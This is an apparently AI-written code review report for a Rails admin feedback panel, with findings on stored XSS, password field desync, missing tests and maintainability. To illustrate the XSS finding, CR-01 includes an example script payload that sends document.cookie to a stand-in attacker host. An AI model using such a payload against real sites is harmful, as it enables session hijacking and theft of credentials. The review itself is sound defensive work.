---
phase: 06-admin-feedback-panel
reviewed: 2026-05-27T12:00:00Z
depth: standard
files_reviewed: 11
files_reviewed_list:
  - app/controllers/admin/artes_controller.rb
  - app/controllers/admin/clients_controller.rb
  - app/controllers/admin/dashboard_controller.rb
  - app/views/admin/artes/show.html.erb
  - app/views/admin/clients/show.html.erb
  - app/views/admin/dashboard/index.html.erb
  - db/migrate/20260527025238_add_admin_reply_to_artes.rb
  - db/schema.rb
  - test/controllers/admin/artes_controller_test.rb
  - test/controllers/admin/clients_controller_test.rb
  - test/controllers/admin/dashboard_controller_test.rb
findings:
  critical: 2
  warning: 2
  info: 4
  total: 8
status: issues_found
---

# Phase 06: Code Review Report

**Reviewed:** 2026-05-27
**Depth:** standard
**Files Reviewed:** 11
**Status:** issues_found

## Summary

Reviewed the admin feedback panel phase including the gap closure changes from plan 06-04: `check_editable` now correctly accepts `change_requested?`, the dashboard controller now whitelists the `status` param via `Arte.statuses.keys.include?`, and the test suite was extended for the `mark_revised` workflow.

The two gap closure changes are implemented correctly. Two critical issues were found in adjacent code that ships in the same diff: a stored XSS vector in the client show modals and a password desync path in the clients controller `update` action. Two warnings flag missing test coverage for the gap closure changes themselves. Four info items cover maintainability concerns.

---

## Critical Issues

### CR-01: Stored XSS — `raw(body)` renders unescaped `@client.name` in confirm modals

**File:** `app/views/admin/clients/show.html.erb:25` and `app/views/admin/clients/show.html.erb:104`

**Issue:** Both `confirm_modal` render calls build the `body:` argument using plain Ruby string interpolation of `@client.name`:

```erb
body: "Desativar <strong>#{@client.name}</strong> bloqueará o acesso ao portal imediatamente."
body: "...link atual de <strong>#{@client.name}</strong> para de funcionar imediatamente..."
```

The `_confirm_modal` partial renders that value with `raw(body)` (partial line 34), bypassing Rails auto-escaping. The `Client` model enforces only presence on `name` — no format restriction or sanitisation. A client name such as `</strong><script>fetch('https://evil.example/steal?c='+document.cookie)</script><strong>` is stored in the database and executed as JavaScript for any admin who opens either modal. Since the admin panel holds session cookies and token-management actions, this is a session-hijack or token-exfiltration vector.

**Fix:** Escape the interpolated name with `h()` before it enters the raw-rendered string:

```erb
body: "Desativar <strong>#{h(@client.name)}</strong> bloqueará o acesso ao portal imediatamente. O cliente não conseguirá acessar o calendário até ser reativado.".html_safe,
```

```erb
body: ("&#9888; <strong>Atenção</strong><br><br>Ao rotacionar o token, o link atual de " \
       "<strong>#{h(@client.name)}</strong> para de funcionar imediatamente e qualquer sessão " \
       "aberta do cliente é encerrada.<br><br>Você precisará enviar o novo link para o cliente.").html_safe,
```

Alternatively, pass `client_name` as a separate local to the partial and escape it there, keeping the partial free of raw user data.

---

### CR-02: `password_plain` directly writable via HTTP, can desync from `password_digest`

**File:** `app/controllers/admin/clients_controller.rb:65` and `app/controllers/admin/clients_controller.rb:38`

**Issue:** `client_params` permits `:password_plain` as an independent field from the browser:

```ruby
params.require(:client).permit(:name, :password, :password_plain, :active)
```

The `update` filter (line 38) only suppresses *blank* values:

```ruby
filtered = client_params.reject { |k, v| ["password", "password_plain"].include?(k) && v.blank? }
```

A request with `password=""` and `password_plain="attacker_value"` causes `password` to be rejected (blank) while `password_plain="attacker_value"` is kept and persisted. The call to `@client.update(filtered)` then saves `password_plain="attacker_value"` without touching `password_digest`. After this, the plaintext value stored in the database and displayed to the admin on the show page is wrong — it no longer matches the bcrypt digest that governs actual client login. The client's real password is unchanged but the admin UI shows a different value, leading to support failures and broken portal links sent to clients.

**Fix:** Remove `:password_plain` from the permitted params list. Derive it exclusively from the `password` field in the controller, not from user input:

```ruby
def client_params
  params.require(:client).permit(:name, :password, :active)
end

def update
  was_active = @client.active
  filtered = client_params.reject { |k, v| k == "password" && v.blank? }
  filtered = filtered.merge(password_plain: filtered[:password]) if filtered[:password].present?
  if @client.update(filtered)
    ...
  end
end
```

---

## Warnings

### WR-01: No direct positive test for `check_editable` allowing `change_requested` and `revised`

**File:** `test/controllers/admin/artes_controller_test.rb:33`

**Issue:** The gap closure adds `change_requested?` (and retains `revised?`) to the `check_editable` guard. The existing negative test (line 33) only verifies that `:approved` is blocked. There is no test asserting that a `GET edit_admin_arte_url` succeeds for `:change_requested` or `:revised`.

The `update_admin_reply` test (line 90) partially covers `check_editable` for `change_requested` via PATCH, but it tests `admin_reply` persistence as a side-effect, not the guard itself. There is no coverage at all for `revised?` being allowed through `check_editable`. A regression that accidentally removes either status from the guard would not be caught.

**Fix:** Add two explicit tests:

```ruby
test "should allow edit for change_requested arte" do
  @arte.update!(status: :change_requested)
  get edit_admin_arte_url(@arte)
  assert_response :success
end

test "should allow edit for revised arte" do
  @arte.update!(status: :revised)
  get edit_admin_arte_url(@arte)
  assert_response :success
end
```

---

### WR-02: Dashboard status filter not tested with invalid or missing values

**File:** `test/controllers/admin/dashboard_controller_test.rb:31`

**Issue:** The whitelist guard in `dashboard_controller.rb` line 8 correctly prevents an `ArgumentError` from ActiveRecord when an unknown enum value reaches `where(status:)`. However, the test suite only covers the happy path (`status: "pending"`). There is no test verifying that an unknown value (e.g., `"nonexistent"`, an empty array, a SQL fragment) is silently discarded and a full unfiltered result is returned without a 500 error.

**Fix:**

```ruby
test "filter by invalid status is ignored and returns all artes" do
  get admin_root_url, params: { status: "nonexistent_status" }
  assert_response :success
  assert_includes response.body, @arte.title
end
```

---

## Info

### IN-01: Variable name `response` shadows `ActionDispatch::TestResponse` in integration test

**File:** `test/controllers/admin/artes_controller_test.rb:84`

**Issue:** In `ActionDispatch::IntegrationTest`, `response` is a built-in method returning the last HTTP response object. Line 84 assigns an `ApprovalResponse` model instance to a local named `response`:

```ruby
response = @arte.approval_responses.build(decision: :approved)
assert response.valid?, ...
response.save!
```

The shadow is benign in this exact test because no HTTP assertions follow it. However, any future assertion added after line 84 that uses `response.body` or `assert_response` would silently evaluate against the model object, producing confusing failures.

**Fix:** Rename the local variable:

```ruby
approval = @arte.approval_responses.build(decision: :approved)
assert approval.valid?, "ApprovalResponse deve ser válida para arte com status revised"
approval.save!
assert @arte.reload.approved?, "Arte deve ficar approved após aprovação pelo cliente"
```

---

### IN-02: "Editar" button hidden for `revised?` and `change_requested?` artes in show view

**File:** `app/views/admin/artes/show.html.erb:17`

**Issue:** The "Editar" link is conditionally shown only for `pending?`:

```erb
<%= link_to "Editar", edit_admin_arte_path(@arte), class: "btn btn-secondary" if @arte.pending? %>
```

After the gap closure, `check_editable` permits editing for `pending?`, `revised?`, and `change_requested?`. For the latter two states, the full edit form is accessible via direct URL but there is no button in the UI. An admin who needs to correct the title or media attachment of a `change_requested` arte must know to manually navigate to the edit URL.

**Fix:** Expand the condition to match `check_editable`:

```erb
<%= link_to "Editar", edit_admin_arte_path(@arte), class: "btn btn-secondary" \
      if @arte.pending? || @arte.revised? || @arte.change_requested? %>
```

---

### IN-03: Redundant `value:` override on `f.text_area :admin_reply`

**File:** `app/views/admin/artes/show.html.erb:35`

**Issue:** The form builder field `f.text_area :admin_reply` automatically binds the textarea's content from `@arte.admin_reply`. The explicit `value: @arte.admin_reply` option is redundant and creates a double-binding that must be updated in two places if the attribute name ever changes:

```erb
<%= f.text_area :admin_reply,
                value: @arte.admin_reply,   # redundant
                rows: 4, ...
```

**Fix:** Remove the explicit `value:` option:

```erb
<%= f.text_area :admin_reply,
                rows: 4,
                placeholder: "Escreva uma nota interna sobre o pedido de alteração do cliente...",
                class: "..." %>
```

---

### IN-04: `status_labels` hardcoded in dashboard view — silently shows `nil` for future statuses

**File:** `app/views/admin/dashboard/index.html.erb:13`

**Issue:** The display label mapping is a static hash in the view. If a new status is added to the `Arte` enum without updating this hash, `Arte.statuses.keys.map { |s| [status_labels[s], s] }` yields `[nil, "new_status"]`, rendering a blank option label in the filter select.

```ruby
status_labels = {
  "pending"          => "Pendente",
  "approved"         => "Aprovado",
  "change_requested" => "Pediu Alteração",
  "revised"          => "Revisado"
}
```

**Fix:** Use `fetch` with a humanised fallback so unknown statuses degrade gracefully rather than silently:

```ruby
status_options = [["Todos os status", ""]] + Arte.statuses.keys.map { |s|
  [status_labels.fetch(s, s.humanize), s]
}
```

---

_Reviewed: 2026-05-27_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
